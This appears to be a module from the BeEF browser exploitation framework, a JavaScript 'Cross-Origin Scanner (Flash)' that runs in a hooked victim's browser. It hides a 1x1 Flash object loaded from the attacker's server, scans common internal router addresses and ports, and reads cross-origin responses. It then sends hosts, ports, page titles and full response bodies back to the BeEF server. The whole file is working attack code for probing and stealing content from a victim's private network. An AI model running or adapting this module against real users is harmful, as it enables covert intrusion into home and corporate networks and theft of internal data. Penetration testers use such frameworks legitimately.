//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var ips = new Array();
  var ipRange = "<%= @ipRange %>";
  var ports   = "<%= @ports %>";
  var threads = parseInt("<%= @threads %>", 10);
  var timeout = parseInt("<%= @timeout %>", 10)*1000;

  // check if Flash is installed (not always reliable)
  if(!beef.browser.hasFlash()) {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support Flash', beef.are.status_error());
    return;
  }

  // set target ports
  if (ports != null) {
    ports = ports.split(',');
  }

  // set target IP addresses
  if (ipRange == 'common') {
    // use default IPs
    ips = [
      '192.168.0.1',
      '192.168.0.100',
      '192.168.0.254',
      '192.168.1.1',
      '192.168.1.100',
      '192.168.1.254',
      '10.0.0.1',
      '10.1.1.1',
      '192.168.2.1',
      '192.168.2.254',
      '192.168.100.1',
      '192.168.100.254',
      '192.168.123.1',
      '192.168.123.254',
      '192.168.10.1',
      '192.168.10.254'
    ];
  } else {
    // set target IP range
    var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
    if (range == null || range[1] == null) {
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
      return;
    }
    // ipRange will be in the form of 192.168.0.1-192.168.0.254
    // (only C class IP ranges are supported atm)
    ipBounds   = ipRange.split('-');
    lowerBound = ipBounds[0].split('.')[3];
    upperBound = ipBounds[1].split('.')[3];
    for (var i = lowerBound; i <= upperBound; i++){
      ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
      ips.push(ipToTest);
    }
  }

  // configure workers
  WorkerQueue = function(id, frequency) {
    var stack = [];
    var timer = null;
    var frequency = frequency;
    var start_scan = (new Date).getTime();
    this.process = function() {
      var item = stack.shift();
      eval(item);
      if (stack.length === 0) {
        clearInterval(timer);
        timer = null;
        var interval = (new Date).getTime() - start_scan;
        beef.debug("[Cross-Origin Scanner (Flash)] Worker #"+id+" has finished ["+interval+" ms]");
        return;
      }
    }
    this.queue = function(item) {
      stack.push(item);
      if (timer === null) timer = setInterval(this.process, frequency);
    }
  }

  // load the SWF object from the BeEF server
  // then request the specified URL via Flash
  var scanUrl = function(proto, host, port) {
    beef.debug('[Cross-Origin Scanner (Flash)] Creating Flash object...');
    var placeholder_id = Math.random().toString(36).substring(2,10);
    div = document.createElement('div');
    div.setAttribute('id', placeholder_id);
    div.setAttribute('style', 'visibility: hidden');
    $j('body').append(div);

    try {
    swfobject.embedSWF(
      beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/objects/ContentHijacking.swf',
      placeholder_id,
      "1",   // Width
      "1",   // Height
      "9",   // Flash version required. Hard-coded to 9+ for no real reason. Tested on Flash 12.
      false, // Don't prompt user to install Flash
      {},    // FlashVars
      {'AllowScriptAccess': 'always'},
      {id: 'cross_origin_flash_'+placeholder_id, width: 1, height: 1, 'style': 'visibility: hidden', 'type': 'application/x-shockwave-flash', 'AllowScriptAccess': 'always'},
      function (e) {
        if (e.success) { 
          // 200 millisecond delay due to Flash executing the callback with a success event
          // even though the object is not yet ready to expose its methods to JS
          setTimeout(function(){
            var url = 'http://'+host+':'+port+'/';
            beef.debug("[Cross-Origin Scanner (Flash)] Fetching URL: " + url);
            var objCaller = document.getElementById('cross_origin_flash_'+placeholder_id);
            try {
            objCaller.GETURL('function(data) { '+
              'var proto = "http";' +
              'var host = "'+host+'";' +
              'var port = "'+port+'";' +
              'var data = unescape(data);' +
              'beef.debug("[Cross-Origin Scanner (Flash)] Received data ["+host+":"+port+"]: " + data);' +

              'if (data.match("securityErrorHandler")) {' +
              '  beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip="+host+"&status=alive", beef.are.status_success());' +
              '}' +

              'if (!data.match("Hijacked Contents:")) return;' +
              'var response = data.replace(/^Hijacked Contents:\\r\\n/);' +

              'var title = "";' +
              'if (response.match("<title>(.*?)<\\/title>")) {' +
              '  title = response.match("<title>(.*?)<\\/title>")[1];' +
              '}' +

              'beef.debug("proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response);' +
              'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response, beef.are.status_success());' +
            ' }', url);
            } catch(e) {
              beef.debug("[Cross-Origin Scanner (Flash)] Could not create object: " + e.message);
            }
          }, 200);
        } else if (e.error) {
          beef.debug('[Cross-Origin Scanner (Flash)] Could not load Flash object');
        } else beef.debug('[Cross-Origin Scanner (Flash)] Could not load Flash object. Perhaps Flash is not installed?');
      });
      // Remove the SWF object from the DOM after <timeout> seconds
      // this also kills the outbound connections from the SWF object
      setTimeout('try { document.body.removeChild(document.getElementById("cross_origin_flash_'+placeholder_id+'")); } catch(e) {}', timeout);
    } catch (e) {
      beef.debug("[Cross-Origin Scanner (Flash)] Something went horribly wrong creating the Flash object with swfobject: " + e.message);
    } 
    beef.debug("[Cross-Origin Scanner (Flash)] Waiting for the flash object to load...");
  }

  // append SWFObject script
  $j('body').append('<scr'+'ipt type="text/javascript" src="'+beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/swfobject.js"></scr'+'ipt>');

  // create workers
  beef.debug("[Cross-Origin Scanner (Flash)] Starting scan ("+(ips.length*ports.length)+" URLs / "+threads+" workers)");
  var workers = new Array();
  for (var id = 0; id < threads; id++) workers.push(new WorkerQueue(id, timeout));

  // allocate jobs to workers
  for (var i = 0; i < ips.length; i++) {
    var worker = workers[i % threads];
    for (var p = 0; p < ports.length; p++) {
      var host = ips[i];
      var port = ports[p];
      if (port == '443') var proto = 'https'; else var proto = 'http';
      worker.queue("scanUrl('"+proto+"', '"+host+"', '"+port+"');");
    }
  }

});

